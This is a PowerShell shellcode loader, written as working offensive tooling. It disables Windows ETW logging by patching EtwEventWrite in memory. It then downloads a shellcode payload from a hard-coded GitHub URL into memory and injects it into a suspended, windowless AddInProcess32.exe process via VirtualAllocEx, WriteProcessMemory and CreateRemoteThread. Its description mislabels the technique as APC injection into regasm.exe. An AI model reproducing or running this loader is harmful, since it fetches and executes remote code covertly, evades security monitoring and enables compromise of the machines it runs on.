#requires -Version 4
<#
.SYNOPSIS
    32-bit shellcode loader using APC injection into regasm.exe.
.DESCRIPTION
    - Patches ETW in the current PowerShell process only.
    - Downloads 32-bit shellcode from a URL into memory.
    - Spawns a suspended 32-bit regasm.exe.
    - Allocates memory RW, writes shellcode, flips to RX.
    - Injects via CreateRemoteThread into suspended AddInProcess32.
#>
param(
    [Parameter(Mandatory = $false)]
    [string]$Url = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/cveil%20v.bin",

    [Parameter(Mandatory = $false)]
    [string]$RegasmPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe",

    [Parameter(Mandatory = $false)]
    [string]$RegasmArgs = "",

    [Parameter(Mandatory = $false)]
    [switch]$PatchETW = $true
)

function Invoke-EtwPatch {
    Write-Host "[*] Patching ntdll!EtwEventWrite in current process"
    $ntdll = [Win32]::GetModuleHandle("ntdll.dll")
    $etw   = [Win32]::GetProcAddress($ntdll, "EtwEventWrite")
    $patch = [byte[]]@(0xC3)
    $size  = [UIntPtr]::new($patch.Length)
    $old   = 0
    if (-not [Win32]::VirtualProtect($etw, $size, 0x40, [ref]$old)) {
        throw "VirtualProtect failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }
    [Runtime.InteropServices.Marshal]::Copy($patch, 0, $etw, $patch.Length)
    [void][Win32]::VirtualProtect($etw, $size, $old, [ref]$old)
    Write-Host "[+] ETW patched"
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr hObject);

    public const uint CREATE_SUSPENDED  = 0x00000004;
    public const uint CREATE_NO_WINDOW  = 0x08000000;
    public const uint THREAD_ALL_ACCESS = 0x001FFFFF;

    public const uint MEM_COMMIT  = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE         = 0x04;
    public const uint PAGE_EXECUTE_READ      = 0x20;

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle;
        public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize;
        public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute;
        public uint dwFlags; public short wShowWindow; public short cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
    }
}
"@ -ErrorAction Stop

function Get-ShellcodeFromUrl {
    param([string]$ShellcodeUrl)
    Write-Host "[*] Downloading shellcode from $ShellcodeUrl"
    $wc = New-Object System.Net.WebClient
    try {
        $bytes = $wc.DownloadData($ShellcodeUrl)
        Write-Host "[+] Downloaded $($bytes.Length) bytes"
    }
    finally { $wc.Dispose() }
    return $bytes
}

function Start-SuspendedRegasm {
    param([string]$Path, [string]$Arguments)
    Write-Host "[*] Creating suspended 32-bit AddInProcess32.exe process"
    $si = New-Object Win32+STARTUPINFO
    $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
    $pi = New-Object Win32+PROCESS_INFORMATION
    $ok = [Win32]::CreateProcess($Path, "$Path $Arguments", [IntPtr]::Zero, [IntPtr]::Zero, $false,
        [Win32]::CREATE_SUSPENDED -bor [Win32]::CREATE_NO_WINDOW, [IntPtr]::Zero,
        (Split-Path -Parent $Path), [ref]$si, [ref]$pi)
    if (-not $ok) { throw "CreateProcess failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())" }
    Write-Host "[+] AddInProcess32 PID: $($pi.dwProcessId), TID: $($pi.dwThreadId)"
    return $pi
}

function Invoke-RemoteThreadInject {
    param([IntPtr]$hProcess, [byte[]]$Shellcode)
    $size = [uint32]$Shellcode.Length
    Write-Host "[*] Allocating RW memory in remote process ($size bytes)"
    $addr = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, [Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE, [Win32]::PAGE_READWRITE)
    if ($addr -eq [IntPtr]::Zero) { throw "VirtualAllocEx failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())" }
    Write-Host "[+] Remote allocation at: $addr"

    $written = [IntPtr]::Zero
    if (-not [Win32]::WriteProcessMemory($hProcess, $addr, $Shellcode, $size, [ref]$written)) {
        throw "WriteProcessMemory failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }
    Write-Host "[+] Wrote $written bytes"

    $old = 0
    Write-Host "[*] Flipping memory protection to RX"
    if (-not [Win32]::VirtualProtectEx($hProcess, $addr, [UIntPtr]::new($size), [Win32]::PAGE_EXECUTE_READ, [ref]$old)) {
        throw "VirtualProtectEx failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }
    Write-Host "[+] Memory is now RX"

    Write-Host "[*] Creating remote thread at shellcode address"
    $hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) { throw "CreateRemoteThread failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())" }
    Write-Host "[+] Remote thread created"
    return $hThread
}

try {
    Write-Host "[*] 32-bit shellcode loader starting"
    Write-Host "[*] Payload URL: $Url"
    if ($PatchETW) { Invoke-EtwPatch }

    $shellcode = Get-ShellcodeFromUrl -ShellcodeUrl $Url
    $proc = Start-SuspendedRegasm -Path $RegasmPath -Arguments $RegasmArgs

    $remoteThread = Invoke-RemoteThreadInject -hProcess $proc.hProcess -Shellcode $shellcode

    Write-Host "[*] Shellcode thread is running; leaving AddInProcess32 main thread suspended"
    [void][Win32]::CloseHandle($remoteThread)
    [void][Win32]::CloseHandle($proc.hProcess)
    Write-Host "[+] Loader finished successfully"
}
catch {
    Write-Error "[-] Loader failed: $_"
}
